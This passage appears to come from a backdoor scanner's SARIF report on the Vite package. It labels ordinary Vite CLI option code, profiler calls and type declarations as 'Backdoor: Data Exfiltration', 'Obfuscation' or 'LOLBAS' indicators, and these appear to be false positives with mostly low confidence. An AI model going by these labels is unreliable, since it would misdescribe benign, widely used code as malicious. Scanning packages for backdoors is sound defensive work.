                      "text": " v;\n};\ncli.option(\"-c, --config <file>\", `[string] use specified config file`).option(\"--base <path>\", `[string] public base path (default: /)`, {\n  type: [convertBase]\n}).option(\"-l, --logLevel <level>\", `[string] info | warn | error | silent`).option(\"--clearScreen\", `[boolean] allow/disable clear screen when logging`).option(\"-d, --debug [feat]\", `[string | boolean] show debug logs`).option(\"-f, --filter <filter>\", `[string] filter debug logs`).option(\"-m, --mode <mode>\", `[string] set env mode`);\ncli.command(\"[root]\", \"start dev server\").alias(\"serve\").alias(\"dev\").option(\"--host [host]\", `[string",
                      "markdown": "` v;\n};\ncli.option(\"-c, --config <file>\", `[string] use specified config file`).option(\"--base <path>\", `[string] public base path (default: /)`, {\n  type: [convertBase]\n}).option(\"-l, --logLevel <level>\", `[string] info | warn | error | silent`).option(\"--clearScreen\", `[boolean] allow/disable clear screen when logging`).option(\"-d, --debug [feat]\", `[string | boolean] show debug logs`).option(\"-f, --filter <filter>\", `[string] filter debug logs`).option(\"-m, --mode <mode>\", `[string] set env mode`);\ncli.command(\"[root]\", \"start dev server\").alias(\"serve\").alias(\"dev\").option(\"--host [host]\", `[string`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/cli.js"
                },
                "region": {
                  "startLine": 810,
                  "startColumn": 25,
                  "endLine": 810,
                  "endColumn": 31,
                  "snippet": {
                    "text": "  `[string] directory under outDir to place assets in (default: assets)`\n).option(\n  \"--assetsInlineLimit <number>\",\n  `[number] static asset base64 inline threshold in bytes (default: 4096)`\n).option(\n  \"--ssr [entry]\",\n  `[string] build specified entry for server-side rendering`\n",
                    "rendered": {
                      "text": "  `[string] directory under outDir to place assets in (default: assets)`\n).option(\n  \"--assetsInlineLimit <number>\",\n  `[number] static asset base64 inline threshold in bytes (default: 4096)`\n).option(\n  \"--ssr [entry]\",\n  `[string] build specified entry for server-side rendering`\n",
                      "markdown": "`  `[string] directory under outDir to place assets in (default: assets)`\n).option(\n  \"--assetsInlineLimit <number>\",\n  `[number] static asset base64 inline threshold in bytes (default: 4096)`\n).option(\n  \"--ssr [entry]\",\n  `[string] build specified entry for server-side rendering`\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/cli.js"
                },
                "region": {
                  "startLine": 784,
                  "startColumn": 30,
                  "endLine": 784,
                  "endColumn": 36,
                  "snippet": {
                    "text": "              profileSession = new inspector.Session();\n              profileSession.connect();\n              profileSession.post(\"Profiler.enable\", () => {\n                profileSession.post(\"Profiler.start\", () => {\n                  server2.config.logger.info(\"Profiler started\");\n                  res();\n                });\n",
                    "rendered": {
                      "text": "              profileSession = new inspector.Session();\n              profileSession.connect();\n              profileSession.post(\"Profiler.enable\", () => {\n                profileSession.post(\"Profiler.start\", () => {\n                  server2.config.logger.info(\"Profiler started\");\n                  res();\n                });\n",
                      "markdown": "`              profileSession = new inspector.Session();\n              profileSession.connect();\n              profileSession.post(\"Profiler.enable\", () => {\n                profileSession.post(\"Profiler.start\", () => {\n                  server2.config.logger.info(\"Profiler started\");\n                  res();\n                });\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/cli.js"
                },
                "region": {
                  "startLine": 783,
                  "startColumn": 28,
                  "endLine": 783,
                  "endColumn": 34,
                  "snippet": {
                    "text": "            await new Promise((res) => {\n              profileSession = new inspector.Session();\n              profileSession.connect();\n              profileSession.post(\"Profiler.enable\", () => {\n                profileSession.post(\"Profiler.start\", () => {\n                  server2.config.logger.info(\"Profiler started\");\n                  res();\n",
                    "rendered": {
                      "text": "            await new Promise((res) => {\n              profileSession = new inspector.Session();\n              profileSession.connect();\n              profileSession.post(\"Profiler.enable\", () => {\n                profileSession.post(\"Profiler.start\", () => {\n                  server2.config.logger.info(\"Profiler started\");\n                  res();\n",
                      "markdown": "`            await new Promise((res) => {\n              profileSession = new inspector.Session();\n              profileSession.connect();\n              profileSession.post(\"Profiler.enable\", () => {\n                profileSession.post(\"Profiler.start\", () => {\n                  server2.config.logger.info(\"Profiler started\");\n                  res();\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/cli.js"
                },
                "region": {
                  "startLine": 666,
                  "startColumn": 18,
                  "endLine": 666,
                  "endColumn": 24,
                  "snippet": {
                    "text": "const stopProfiler = (log) => {\n  if (!profileSession) return;\n  return new Promise((res, rej) => {\n    profileSession.post(\"Profiler.stop\", (err, { profile }) => {\n      if (!err) {\n        const outPath = path.resolve(\n          `./vite-profile-${profileCount++}.cpuprofile`\n",
                    "rendered": {
                      "text": "const stopProfiler = (log) => {\n  if (!profileSession) return;\n  return new Promise((res, rej) => {\n    profileSession.post(\"Profiler.stop\", (err, { profile }) => {\n      if (!err) {\n        const outPath = path.resolve(\n          `./vite-profile-${profileCount++}.cpuprofile`\n",
                      "markdown": "`const stopProfiler = (log) => {\n  if (!profileSession) return;\n  return new Promise((res, rej) => {\n    profileSession.post(\"Profiler.stop\", (err, { profile }) => {\n      if (!err) {\n        const outPath = path.resolve(\n          `./vite-profile-${profileCount++}.cpuprofile`\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/cli.js"
                },
                "region": {
                  "startLine": 877,
                  "startColumn": 108,
                  "endLine": 877,
                  "endColumn": 116,
                  "snippet": {
                    "text": "    }\n  }\n);\ncli.command(\"preview [root]\", \"locally preview production build\").option(\"--host [host]\", `[string] specify hostname`, { type: [convertHost] }).option(\"--port <port>\", `[number] specify port`).option(\"--strictPort\", `[boolean] exit if specified port is already in use`).option(\"--open [path]\", `[boolean | string] open browser on startup`).option(\"--outDir <dir>\", `[string] output directory (default: dist)`).action(\n  async (root, options) => {\n    filterDuplicateOptions(options);\n    const { preview } = await import('./chunks/dep-BzOvws4Y.js').then(function (n) { return n.G; });\n",
                    "rendered": {
                      "text": "    }\n  }\n);\ncli.command(\"preview [root]\", \"locally preview production build\").option(\"--host [host]\", `[string] specify hostname`, { type: [convertHost] }).option(\"--port <port>\", `[number] specify port`).option(\"--strictPort\", `[boolean] exit if specified port is already in use`).option(\"--open [path]\", `[boolean | string] open browser on startup`).option(\"--outDir <dir>\", `[string] output directory (default: dist)`).action(\n  async (root, options) => {\n    filterDuplicateOptions(options);\n    const { preview } = await import('./chunks/dep-BzOvws4Y.js').then(function (n) { return n.G; });\n",
                      "markdown": "`    }\n  }\n);\ncli.command(\"preview [root]\", \"locally preview production build\").option(\"--host [host]\", `[string] specify hostname`, { type: [convertHost] }).option(\"--port <port>\", `[number] specify port`).option(\"--strictPort\", `[boolean] exit if specified port is already in use`).option(\"--open [path]\", `[boolean | string] open browser on startup`).option(\"--outDir <dir>\", `[string] output directory (default: dist)`).action(\n  async (root, options) => {\n    filterDuplicateOptions(options);\n    const { preview } = await import('./chunks/dep-BzOvws4Y.js').then(function (n) { return n.G; });\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/cli.js"
                },
                "region": {
                  "startLine": 728,
                  "startColumn": 112,
                  "endLine": 728,
                  "endColumn": 120,
                  "snippet": {
                    "text": "ng`).option(\"-d, --debug [feat]\", `[string | boolean] show debug logs`).option(\"-f, --filter <filter>\", `[string] filter debug logs`).option(\"-m, --mode <mode>\", `[string] set env mode`);\ncli.command(\"[root]\", \"start dev server\").alias(\"serve\").alias(\"dev\").option(\"--host [host]\", `[string] specify hostname`, { type: [convertHost] }).option(\"--port <port>\", `[number] specify port`).option(\"--open [path]\", `[boolean | string] open browser on startup`).option(\"--cors\", `[boolean] enable CORS`).option(\"--strictPort\", `[boolean] exit if specified port is already in use`).option(\n  \"--force\",\n  `[boolean] ",
                    "rendered": {
                      "text": "ng`).option(\"-d, --debug [feat]\", `[string | boolean] show debug logs`).option(\"-f, --filter <filter>\", `[string] filter debug logs`).option(\"-m, --mode <mode>\", `[string] set env mode`);\ncli.command(\"[root]\", \"start dev server\").alias(\"serve\").alias(\"dev\").option(\"--host [host]\", `[string] specify hostname`, { type: [convertHost] }).option(\"--port <port>\", `[number] specify port`).option(\"--open [path]\", `[boolean | string] open browser on startup`).option(\"--cors\", `[boolean] enable CORS`).option(\"--strictPort\", `[boolean] exit if specified port is already in use`).option(\n  \"--force\",\n  `[boolean] ",
                      "markdown": "`ng`).option(\"-d, --debug [feat]\", `[string | boolean] show debug logs`).option(\"-f, --filter <filter>\", `[string] filter debug logs`).option(\"-m, --mode <mode>\", `[string] set env mode`);\ncli.command(\"[root]\", \"start dev server\").alias(\"serve\").alias(\"dev\").option(\"--host [host]\", `[string] specify hostname`, { type: [convertHost] }).option(\"--port <port>\", `[number] specify port`).option(\"--open [path]\", `[boolean | string] open browser on startup`).option(\"--cors\", `[boolean] enable CORS`).option(\"--strictPort\", `[boolean] exit if specified port is already in use`).option(\n  \"--force\",\n  `[boolean] `"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/types/hmrPayload.d.ts"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 16,
                  "endLine": 18,
                  "endColumn": 24,
                  "snippet": {
                    "text": "  updates: Update[]\n}\n\nexport interface Update {\n  type: 'js-update' | 'css-update'\n  path: string\n  acceptedPath: string\n",
                    "rendered": {
                      "text": "  updates: Update[]\n}\n\nexport interface Update {\n  type: 'js-update' | 'css-update'\n  path: string\n  acceptedPath: string\n",
                      "markdown": "`  updates: Update[]\n}\n\nexport interface Update {\n  type: 'js-update' | 'css-update'\n  path: string\n  acceptedPath: string\n`"
                    }
                  },
                  "sourceLanguage": "typescript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/index.d.cts"
                },
                "region": {
                  "startLine": 2,
                  "startColumn": 38,
                  "endLine": 2,
                  "endColumn": 44,
                  "snippet": {
                    "text": "/**\n * @deprecated The CJS build of Vite's Node API is deprecated. See https://vitejs.dev/guide/troubleshooting.html#vite-cjs-node-api-deprecated for more details.\n */\ndeclare const module: any\n\n",
                    "rendered": {
                      "text": "/**\n * @deprecated The CJS build of Vite's Node API is deprecated. See https://vitejs.dev/guide/troubleshooting.html#vite-cjs-node-api-deprecated for more details.\n */\ndeclare const module: any\n\n",
                      "markdown": "`/**\n * @deprecated The CJS build of Vite's Node API is deprecated. See https://vitejs.dev/guide/troubleshooting.html#vite-cjs-node-api-deprecated for more details.\n */\ndeclare const module: any\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        }
      ],
      "columnKind": "utf16CodeUnits"
    }
  ]
}